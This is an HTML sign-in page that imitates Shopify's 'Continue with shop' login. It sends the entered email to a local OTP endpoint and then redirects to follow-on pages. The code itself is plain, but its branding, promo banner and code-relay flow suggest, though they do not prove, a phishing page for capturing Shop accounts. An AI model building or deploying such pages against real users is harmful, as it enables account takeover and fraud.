<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Sign in</title>
    <style>
      :root {
        color-scheme: light;
        --bg: #f6f6f7;
        --card: #ffffff;
        --text: #111827;
        --muted: rgba(17, 24, 39, 0.6);
        --border: rgba(17, 24, 39, 0.12);
        --shadow: 0 18px 60px rgba(17, 24, 39, 0.12);
        --radius: 10px;
        --shop: #5a31f4;
        --continue: #0a5bd3;
      }
      * {
        box-sizing: border-box;
      }
      html,
      body {
        height: 100%;
      }
      body {
        margin: 0;
        font-family:
          system-ui,
          -apple-system,
          Segoe UI,
          Roboto,
          Helvetica,
          Arial,
          "Apple Color Emoji",
          "Segoe UI Emoji";
        background: var(--bg);
        color: var(--text);
      }
      .wrap {
        min-height: 100%;
        display: grid;
        place-items: center;
        padding: 34px 16px;
      }
      .stack {
        width: min(420px, 100%);
        display: grid;
        justify-items: center;
        gap: 16px;
      }
      .card {
        width: 100%;
        background: var(--card);
        border: 1px solid rgba(17, 24, 39, 0.08);
        border-radius: var(--radius);
        box-shadow: var(--shadow);
        padding: 26px 26px 18px;
      }
      .limited-offer {
        display: flex;
        justify-content: center;
        margin-bottom: 18px;
      }
      .limited-offer img {
        width: min(320px, 100%);
        height: auto;
        display: block;
      }
      .h1 {
        margin: 0;
        text-align: left;
        font-size: 22px;
        font-weight: 850;
        letter-spacing: -0.03em;
      }
      .sub {
        margin: 6px 0 16px;
        text-align: left;
        font-size: 13px;
        color: var(--muted);
      }
      .btn {
        width: 100%;
        height: 48px;
        border-radius: 8px;
        border: 0;
        font-weight: 850;
        font-size: 14px;
        color: #ffffff;
        cursor: pointer;
      }
      .btn:disabled {
        opacity: 0.65;
        cursor: not-allowed;
      }
      .btn--shop {
        background: var(--shop);
      }
      .btn--continue {
        background: var(--continue);
      }
      .divider {
        position: relative;
        margin: 14px 0;
        display: grid;
        place-items: center;
      }
      .divider::before {
        content: "";
        position: absolute;
        left: 0;
        right: 0;
        top: 50%;
        height: 1px;
        background: rgba(17, 24, 39, 0.12);
      }
      .divider span {
        position: relative;
        background: var(--card);
        padding: 0 10px;
        font-size: 12px;
        color: rgba(17, 24, 39, 0.45);
      }
      form {
        display: grid;
        gap: 12px;
      }
      .input {
        width: 100%;
        height: 46px;
        border-radius: 8px;
        border: 1px solid rgba(17, 24, 39, 0.14);
        padding: 0 12px;
        font-size: 14px;
        outline: none;
        background: #ffffff;
        color: var(--text);
      }
      .input:focus {
        border-color: rgba(10, 91, 211, 0.9);
        box-shadow: 0 0 0 3px rgba(10, 91, 211, 0.12);
      }
      .check {
        display: flex;
        align-items: flex-start;
        gap: 10px;
        font-size: 12px;
        color: rgba(17, 24, 39, 0.78);
        line-height: 1.35;
      }
      .check input {
        width: 14px;
        height: 14px;
        margin-top: 2px;
        accent-color: var(--continue);
      }
      .terms {
        margin: 6px 0 0;
        text-align: center;
        font-size: 11px;
        color: rgba(17, 24, 39, 0.45);
      }
      .terms a {
        color: rgba(17, 24, 39, 0.55);
      }
      .status {
        min-height: 16px;
        font-size: 12px;
        color: rgba(17, 24, 39, 0.7);
      }
      .status.is-error {
        color: #b42318;
      }
      .privacy {
        font-size: 12px;
        color: #1d4ed8;
        text-decoration: none;
      }
      .privacy:hover {
        text-decoration: underline;
      }

      @media (max-width: 520px) {
        body {
          background: #ffffff;
        }
        .wrap {
          padding: 0;
          place-items: stretch;
        }
        .stack {
          width: 100%;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          gap: 0;
          padding: 56px 22px 34px;
        }
        .card {
          border-radius: 0;
          border: 0;
          box-shadow: none;
          padding: 0;
          background: transparent;
        }
        .limited-offer {
          margin-bottom: 32px;
        }
        .limited-offer img {
          width: min(360px, 100%);
        }
        .h1 {
          font-size: 42px;
          letter-spacing: -0.04em;
        }
        .sub {
          font-size: 22px;
          margin: 10px 0 28px;
        }
        .btn {
          height: 76px;
          border-radius: 18px;
          font-size: 22px;
        }
        .divider {
          margin: 26px 0 22px;
        }
        .divider::before {
          height: 2px;
          background: rgba(17, 24, 39, 0.16);
        }
        .divider span {
          font-size: 18px;
          padding: 0 18px;
          background: #ffffff;
          color: rgba(17, 24, 39, 0.55);
        }
        .input {
          height: 78px;
          border-radius: 18px;
          border-width: 2px;
          font-size: 22px;
          padding: 0 18px;
        }
        .input:focus {
          border-color: rgba(10, 91, 211, 1);
          box-shadow: 0 0 0 4px rgba(10, 91, 211, 0.12);
        }
        .check {
          margin-top: 6px;
          gap: 14px;
          font-size: 20px;
          align-items: center;
        }
        .check input {
          width: 22px;
          height: 22px;
          margin-top: 0;
        }
        .terms {
          margin: 28px 0 0;
          font-size: 18px;
        }
        .privacy {
          margin-top: auto;
          padding: 44px 0 0;
          text-align: center;
          font-size: 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="wrap">
      <div class="stack">
        <div class="card">
          <div class="limited-offer">
            <img
              src="https://cdn.shopify.com/s/files/1/0967/3775/5412/files/LIMITED_TIME_OFFER_3_x320.png?v=1772663214"
              alt="LIMITED TIME OFFER"
            />
          </div>

          <h1 class="h1">Sign in</h1>
          <div class="sub">Sign in or create an account</div>

          <button id="continue-shop" class="btn btn--shop" type="button">
            Continue with shop
          </button>

          <div class="divider"><span>or</span></div>

          <form id="login-form" autocomplete="on">
            <input
              id="email"
              class="input"
              name="email"
              type="email"
              autocomplete="email"
              placeholder="Email"
              required
            />
            <button id="continue" class="btn btn--continue" type="submit">
              Continue
            </button>
            <label class="check">
              <input id="updates" type="checkbox" checked />
              <span>Send me live tracking and order updates</span>
            </label>
            <div
              id="status"
              class="status"
              role="status"
              aria-live="polite"
            ></div>
            <div class="terms">
              By continuing, you agree to our
              <a href="/policies/terms.html">Terms of service</a>
            </div>
          </form>
        </div>

        <a class="privacy" href="/policies/privacy.html">Privacy policy</a>
      </div>
    </div>

    <script src="/assets/local-storage.js"></script>
    <script>
      (function () {
        var form = document.getElementById("login-form");
        var emailEl = document.getElementById("email");
        var btn = document.getElementById("continue");
        var shopBtn = document.getElementById("continue-shop");
        var statusEl = document.getElementById("status");

        function setStatus(text, kind) {
          statusEl.textContent = text || "";
          statusEl.classList.remove("is-error");
          if (kind === "error") statusEl.classList.add("is-error");
        }

        function storeEmail(email) {
          try {
            localStorage.setItem("loginEmail", email);
          } catch (e) {}
        }

        // Direct Email Login (the form)
        form.addEventListener("submit", async function (e) {
          e.preventDefault();
          var email = emailEl.value.trim();
          if (!email) {
            setStatus("Enter your email.", "error");
            return;
          }

          btn.disabled = true;
          setStatus("Sending code...", "");

          storeEmail(email);

          try {
            const res = await fetch("/api/start-otp", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ email }),
            });

            const data = await res.json();

            if (data.success) {
              window.location.href = "/second-finish.html";
            } else {
              setStatus(data.error || "Failed to send code", "error");
            }
          } catch (err) {
            setStatus("Network error. Is server running?", "error");
          } finally {
            btn.disabled = false;
          }
        });

        // "Continue with Shop" button
        if (shopBtn) {
          shopBtn.addEventListener("click", function () {
            var email = emailEl.value.trim();
            if (email) storeEmail(email);
            shopBtn.disabled = true;
            setStatus("Redirecting...", "");
            setTimeout(() => {
              window.location.href = "/shop.html";
            }, 400);
          });
        }
      })();
    </script>
  </body>
</html>
